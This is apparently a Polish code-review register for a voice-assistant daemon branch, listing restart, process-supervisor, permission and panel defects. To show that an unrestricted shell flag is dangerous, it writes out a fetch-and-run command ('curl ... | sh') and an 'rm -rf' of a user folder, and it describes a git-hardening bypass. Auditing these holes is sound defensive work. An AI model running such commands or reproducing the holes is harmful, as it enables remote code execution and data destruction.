# Review 2026-07-21 — restart, reklamacja sieroty, shell_read

> **Status:** przegląd max-effort gałęzi `agent/dan-release1-integration`.
> Zakres: commit `9305568` (25 plików) + niezacommitowane zmiany drugiej sesji
> (`shell_read_unrestricted`, `personas.toml`).
> Dziesięć niezależnych kątów wyszukiwania; najcięższe zarzuty zweryfikowane
> ręcznie przez czytanie kodu i żywego procesu, nie na słowo agenta.
> **Nic z tej listy nie zostało naprawione** — dokument jest rejestrem, nie raportem z fixów.

## Legenda pewności

- **POTWIERDZONE** — sprawdziłem sam, czytając kod albo mierząc żywy runtime.
- **PRZEŚLEDZONE** — spójny mechanizm z konkretnymi `file:line`, ale bez mojego odczytu.

---

## 1. Reklamacja sieroty nigdy nie odpala w produkcji — POTWIERDZONE

`dan/daemon/supervisor.py:190`

```python
return shlex.split(command) == list(spec.argv)
```

`spec.argv` (`dan/daemon/app.py:1668-1677`) zaczyna się od samego binarium
supertonica — 8 tokenów. `ps -p <pid> -o ppid=,command=` na tej maszynie zwraca 9
tokenów, bo `~/.dan/venv/bin/supertonic` jest skryptem z shebangiem i jądro
wstawia ścieżkę interpretera na początek:

```
/Users/n1_ozzy/.homebrew/Cellar/python@3.14/.../Python.app/Contents/MacOS/Python \
  /Users/n1_ozzy/.dan/venv/bin/supertonic serve --model supertonic-3 --port 7788 --log-level warning
```

Porównanie jest **zawsze** fałszywe → `_default_find_own_orphan` zwraca `None` →
`_reclaim_own_orphan_locked` zwraca `False` → po `launchctl kickstart -k` dand
dalej dostaje `ForeignPortOwnerError` i głos zostaje martwy. Fail-dead, który ta
zmiana i ADR-001 §"Ports" deklarują jako naprawiony, jest nietknięty.

Testy przechodzą, bo karmią `' '.join(SUPERTONIC_SPEC.argv)` albo wstrzykują
`orphan_probe` — czyli sprawdzają logikę na danych, których produkcja nigdy nie
wytworzy.

### PUŁAPKA W KOLEJNOŚCI NAPRAW

`_is_own_orphan` wymaga **obu** warunków: identyczne argv **i** `ppid == 1`.
Dopóki argv nigdy nie pasuje, nikt nikogo nie zabija. Naprawa porównania argv na
skróty (obcięcie interpretera, porównanie sufiksu) **natychmiast uzbraja**
pozostałe defekty:

- na macOS **każdy** proces startowany przez launchd ma `ppid == 1`, więc cudza
  usługa z tym samym argv zostanie uznana za naszą sierotę i ubita, a launchd ją
  wskrzesi → pętla kill/respawn i złamanie reguły ADR-001 „never kill someone
  else's process";
- `supervisor.py:719` woła `killpg` z PID-em zwróconym przez `lsof` (patrz §7).

**Argv i dowód własności trzeba naprawić razem, nie po kolei.**

---

## 2. `shell_read_unrestricted` = dowolny shell dla modelu — POTWIERDZONE

`dan/tools/shell_tool.py:119` (+ `dan/config.py:403`, `dan/daemon/app.py:2188`)

```python
if not self.unrestricted and normalized not in self.whitelist:
```

Allowlista była **jedyną** barierą:

- `dan/tools/permissions.py:142-157` — `ToolPermissionPolicy.decide()` zwraca
  `_allow()` bezwarunkowo dla każdego ryzyka i każdego źródła
  („Runtime-lab policy: tools run without approval gates");
- `dan/tools/shell_tool.py:141` — `subprocess.run(..., shell=True)` bez żadnej
  sanityzacji metaznaków.

Przy `security.shell_read_unrestricted = true` model emitujący
`shell_read {"command": "curl -s http://x/p.sh | sh"}` albo `rm -rf ~/Documents/dev`
wykonuje to bez allowlisty, bez wiersza approval i bez gatingu po źródle.
Deklarowane w docstringu „approved-root containment" ogranicza **wyłącznie `cwd`** —
argv niesie własne ścieżki absolutne. Narzędzie dalej raportuje `risk="shell_read"`
i opisuje się modelowi jako read-only.

## 3. Utwardzenie gita omijalne po zdjęciu allowlisty — POTWIERDZONE

`dan/tools/shell_tool.py:130`

```python
if argv_check and argv_check[0] == "git":
```

Ten warunek był wyczerpujący **tylko** dlatego, że allowlista dopuszczała
skończony zbiór dosłownych stringów. Bez niej `/usr/bin/git status`,
`cd sub && git status`, `env git status`, `sh -c 'git status'` mają `argv[0]`
różne od `"git"` → `_GIT_ARGV_HARDENING` (`core.fsmonitor=`, `core.hooksPath=/dev/null`,
`protocol.ext.allow=never`) i `_GIT_ENV_HARDENING` nie są nakładane → wrogie repo
wykonuje własny program `core.fsmonitor`. To zdalne wykonanie kodu z narzędzia
opisanego jako read-only.

Nowy test `test_unrestricted_keeps_the_git_hardening` sprawdza wyłącznie dosłowne
`git status --short`, więc przechodzi mimo dziury.

## 4. Nowa flaga bez walidacji typu — POTWIERDZONE

`dan/config.py:598-600` — `_build_security_config` filtruje tylko klucze i nie
waliduje typów, inaczej niż `_build_memory_config` tuż niżej (`config.py:627`),
które woła `_require_config_bool`.

`shell_read_unrestricted = "false"` (typowa literówka w TOML) → string przechodzi
do frozen dataclassy bez `__post_init__` → `shell_tool.py:114` robi
`bool("false") == True` → demon startuje z **wyłączoną** allowlistą i nigdzie nie
zgłasza błędu. Fail-open na przełączniku bezpieczeństwa.

## 5. Flaga zapisywalna przez HTTP — PRZEŚLEDZONE

`security.shell_read_unrestricted` nie trafiła do `_VERSIONED_KEYS`, więc ląduje
w zapisywalnym koszyku INSTALLATION — w przeciwieństwie do sąsiednich
`require_approval_for_*`, celowo read-only. Przy `api_token_required` domyślnie
`False` sekwencja `POST /settings` + `POST /runtime/restart` uzbraja dowolne
wykonanie shella na stałe, bez dotykania pliku konfiguracyjnego.

---

## 6. Restart: `exit 86` na fałszywej premisie — POTWIERDZONE

`dan/daemon/restart.py:121-133`

Gałąź „drain padł, ale containment kompletny → `os._exit(86)`" była napisana na
założeniu, że `stop()` zdążył zdemontować warstwę głosu. **To nieprawda.**
`DaemonApp.stop()` ma cztery miejsca rzucenia i **trzy z nich są przed**
`self.voice_broker = None` (`app.py:553`):

| miejsce | co rzuca | stan w chwili rzutu |
|---|---|---|
| `app.py:482` | `close_intake` → `DaemonLifecycleError` | wszystko żywe |
| `app.py:483` | `wait_for_drain` → `IntakeGateError` (`intake.py:142`) | wszystko żywe |
| `app.py:552` | `_quiesce_voice_broker` → `DaemonLifecycleError` (`app.py:1728/1734/1741`) | broker zatrzymywany, referencja zachowana |
| `app.py:568` / `:582` | po demontażu | premisa trzyma |

Najczęstsza awaria restartu to **timeout drenażu** — długa wypowiedź lub
generacja mózgu trzymająca lease dłużej niż `INTAKE_DRAIN_TIMEOUT_SECONDS`.
Po tej zmianie taki przypadek kończy się twardym `os._exit(86)` na w pełni żywym
demonie, w środku tury. Przed zmianą proces zostawał żywy i ponowienie restartu
po zwolnieniu lease by się udało.

## 7. `exit 86` osierocą procesy spoza supervisora — PRZEŚLEDZONE

`ChildContainmentResult` dowodzi śmierci **wyłącznie** dzieci `ChildSupervisora`
(supertonic). `os._exit(86)` przeskakuje resztę `stop()`:

- `app.py:585` `_stop_hotkey_monitor()` — nigdy nie wykonane;
- `app.py:590` `brain_manager.close()` — proces stream-json Claude'a startowany
  z `start_new_session=True` ma własną grupę procesów i przeżywa;
- rekorder `sox` startowany bez `start_new_session` też przeżywa → **gorący
  mikrofon** po wskrzeszeniu przez launchd;
- zdarzenie `daemon.stopped` nie jest dopisywane, bloki `finally` nie lecą,
  `logging.shutdown()` jest pomijany.

Efekt: drugi proces Claude'a i drugi `sox` na tym samym mikrofonie — dokładnie
podwójny właściciel, którego ADR-001 zakazuje.

## 8. `mark_failed` łyka własną awarię — POTWIERDZONE

`dan/daemon/app.py:664` — `except Exception: log(...)` bez zmiany stanu.
`snapshot_state()` wyprowadza `ok` z `state != ERROR` (`app.py:672`), więc gdy
zapis ERROR padnie (baza zablokowana/pełna — ta sama klasa awarii, która najpewniej
wywaliła drenaż), maszyna zostaje w IDLE i `/health` dalej ręczy za niemego demona.

Repozytorium ma już wzorzec na ten przypadek: `RuntimeStateMachine.force_idle`
(`state_machine.py:145-182`) przypisuje `self._state` **nawet gdy** append eventu
padnie. Brakuje siostrzanego `force_error`.

Dodatkowo guard `if machine.state is RuntimeState.ERROR: return` nie pokrywa
STOPPING — drugiego stanu bez wyjść (`state_machine.py:111-114`).

## 9. Stan ERROR nie jest trwały — POTWIERDZONE

`state_machine.py:57` — `_NORMAL_TRANSITIONS[ERROR] = {IDLE}`.

Wątki robocze są drenowane dopiero w `app.py:600`, więc przy zablokowanym
restarcie jeden może być w środku tury. `mark_failed` ustawia ERROR, tura się
kończy, orkiestrator woła `_return_to_idle` → `ok` wraca na `true`, podczas gdy
intake jest zamknięty, głos zdemontowany, a dzieci nadzorowane dalej żyją.

## 10. Panel ukrywa jedyny odczyt stanu runtime — PRZEŚLEDZONE

`dan/panel/assets/typewriter.js:143` + `:239` + `:292`

`hideChrome()` ustawia `display:none` na `#activityStrip` przy ładowaniu i
ponownie co 600 ms. To jedyny element renderujący stan runtime (`#stateLabel`,
`#activityStage`, `#activityTool`, `#activityStatus`, `#activityResult`) i jedyny
region `aria-live` w panelu. `app.js:7679-7685` wpisuje tam `ERROR` / `Runtime error`.

Czyli mechanizm z §8 zapala czerwone światło na elemencie, który ten sam commit
ukrywa. Zastępcza linia meta w `rewriteMeta` działa tylko przy żywym dymku DAN-a
(`typewriter.js:116`), a demon po nieudanym restarcie nie mówi → nic nie widać.

Łamie `AGENTS.md:15`: „Panel: render effective runtime state".

---

## 11. Regresja barge-in (FIX-09 z powrotem otwarty) — POTWIERDZONE (mechanizm)

`dan/voice/queue.py:361-371`

```python
queue_turn_ids = _unique_nonempty(session_id for _, session_id in rows)
...
tombstoned = self._tombstone_turns_in_transaction(generation_turn_ids)
```

`queue_turn_ids` jest wyliczane i **wyrzucane** — nagrobek dostają wyłącznie
`generation_turn_ids` z `GenerationRegistry`. Komentarz broni tego twierdzeniem,
że session id to „nazwy kanałów"; w rzeczywistości `session_id` to identyfikator
tury orkiestratora.

Luka otwiera się zawsze, gdy rejestr generacji jest pusty w chwili anulowania:

- adaptery `qwen`, `ollama`, `eco_brain`, `test` **nigdy** nie wołają `.register()`
  (robi to tylko `claude_cli_adapter.py`), a `brain.current_adapter` jest kluczem
  zapisywalnym przez API;
- **także domyślny adapter Claude'a** — w trakcie wykonywania narzędzia, gdy
  `unregister` już poszło.

Scenariusz: wchodzisz w słowo, gdy DAN komentuje przed tool-callem → wiersze lecą
na `cancelled`, tura nie dostaje nagrobka, narzędzie wraca, orkiestrator kolejkuje
odpowiedź pod tym samym turn id → DAN mówi to, co mu właśnie przerwałeś.

## 12. Skasowane testy polityki uprawnień — PRZEŚLEDZONE

Diff kasuje `tests/test_screen_read_policy.py`, `test_source_sensitive_policy.py`,
`test_ui_act_policy.py`, `test_ui_read_policy.py` (~328 linii). Po tym w `tests/`
nie ma **żadnej** asercji na `BLOCKED` ani `APPROVAL_REQUIRED` dla jakiejkolwiek
pary (risk, source), a `_blocked()` staje się kodem martwym.

Trzy pliki siostrzane przetrwały i dalej padają — pomiar agenta:
7 failed / 62 passed, w tym `test_ui_click_blocked_for_auto_sources`, gdzie
`ui_click` ze źródła `SCHEDULED_WORKER` faktycznie wykonuje kliknięcie.
`pyproject.toml` zmienia tylko `addopts` i niczego nie ignoruje, więc strata nie
jest zamaskowana. `docs/MACOS_PERMISSION_MODEL.md` dalej opisuje tę macierz jako
egzekwowaną.

---

## 13. Supervisor: `killpg` z PID-em z `lsof` — PRZEŚLEDZONE

`supervisor.py:719` — `os.killpg` interpretuje pierwszy argument jako **grupę**.
Gdy sierota nie jest liderem swojej grupy, oba sygnały rzucają `ProcessLookupError`,
połknięty w `:720-721` → port nie zostaje zwolniony, a log twierdzi, że reklamacja
się udała. W drugą stronę: między `lsof` a sygnałem stoją dwa `subprocess.run`
z limitami 5 s; jeśli PID zostanie w tym czasie przydzielony ponownie liderowi
niepowiązanej grupy, `killpg(..., SIGKILL)` niszczy cudze drzewo procesów.

## 14. Supervisor: ~31 s snu pod lockiem na ścieżce startu — PRZEŚLEDZONE

`supervisor.py:733` — `_await_port_release` przechodzi cały spawn-owy backoff
`(0.5, 1.0, 2.0, 4.0, 8.0)` = 15,5 s, osobno po SIGTERM i po SIGKILL, trzymając
RLock supervisora branego w `ensure_running` (czyli w `DaemonApp.start()`) i w
`_restart_dead_child_locked`.

Sprzężenie: równoległy `POST /runtime/restart` wchodzi w `stop_all(timeout=5.0)`,
którego `acquire` wygasa (`supervisor.py:468`), zwraca `_incomplete_stop_result` →
`app.py:580` rzuca → exit zablokowany i `mark_failed` spycha **zdrowego** demona
do `RuntimeState.ERROR` tylko dlatego, że watchdog siedział w nowej ścieżce.

Harmonogram ponawiania spawnu to zły stały czas na „jądro zwolniło gniazdo"
(natychmiast). Właściwe: jedno okno ~1 s odpytywane co 50 ms.

---

## 15. Panel: zaszyta prędkość persony — POTWIERDZONE

`dan/panel/assets/typewriter.js:10` — `var perChar = 58 / 1.29;`

`CLAUDE.md:9`: „Voice/personas: canon IN THIS REPO — `config/voice/`
(`personas.toml` + `pronunciations.toml`); do NOT hardcode values."
`AGENTS.md:22` powtarza: „never copy values into docs".

Commit `9305568` zmienił `[dan] speed` z 1.29 na 1.32 i nie ruszył `typewriter.js:10`,
mimo że przepisał ten sam plik — panel tempował według prędkości, której runtime już
nie używał. Niezacommitowana zmiana cofa kanon do 1.29, co resynchronizuje obie
liczby **przypadkiem**. Prędkość powinna być czytana z demona.

## 16. Drobne — POTWIERDZONE

- `dan/panel/assets/index.html:505` — `<script src="./typewriter.js">` trzy razy
  w jednej linii. Dziś nieszkodliwe tylko dzięki guardowi
  `window.__danTypewriterLoaded` (`typewriter.js:2`); bez niego trzy zestawy
  `setInterval` (`pollEvents` 250 ms, `pollQueue`, painter 40 ms) i trzy painter-y
  na tym samym dymku.
- `dan/panel/assets/typewriter.js:128` — detektor zmiany porównuje string
  zawierający zegar sekundowy, więc „puls" odpala raz na sekundę na bezczynnym
  panelu i zostawia niesprzątane `setTimeout`.
- `dan/voice/queue.py:467` — po usunięciu flagi `tombstone_session`
  `cancel_superseded_request` jest identyczne z `cancel_request`.
- `dan/daemon/restart.py:141` — gałąź blokująca resetuje `_restarting`, ale
  zostawia stare `_operation_id`; kolejny `POST /runtime/restart` dostaje id
  poprzedniej, nieudanej operacji, bo `close_intake` widzi bramkę już zamkniętą.

---

## Co dalej — kolejność

1. **§1 + pułapka** — reklamacja sieroty jest martwa; naprawiać razem z dowodem
   własności (§13), nigdy osobno.
2. **§2–§5** — `shell_read_unrestricted` w obecnej postaci to dowolny shell dla
   modelu. Minimum: walidacja typu, klucz read-only, matcher argv zamiast
   przełącznika globalnego.
3. **§6–§9** — restart: `exit 86` musi zależeć od tego, co `stop()` faktycznie
   zdemontował, a nie od containmentu dzieci; `mark_failed` potrzebuje
   `force_error` na wzór `force_idle` i odporności na powrót ERROR → IDLE.
4. **§11** — barge-in.
